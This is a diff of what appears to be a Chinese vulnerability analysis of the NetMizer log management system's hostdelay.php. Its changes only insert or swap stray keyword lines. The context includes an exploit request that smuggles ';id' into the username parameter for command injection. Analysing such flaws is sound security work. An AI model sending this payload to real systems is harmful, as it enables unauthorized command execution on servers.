@@ -20,6 +20,14 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 # 漏洞分析
 
+深入探索
+
+代理与过滤
+
+开发工具
+
+vpn
+
 看下 `hostdelay.php` 业务实现关键逻辑部分
 
 网络安全
@@ -104,7 +112,7 @@ else if($action == 'detail'){  // do by C
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-计算机服务器
+网络
 
 ```
 GET /data/chart/hostdelay.php?action=list&username=;id HTTP/1.1
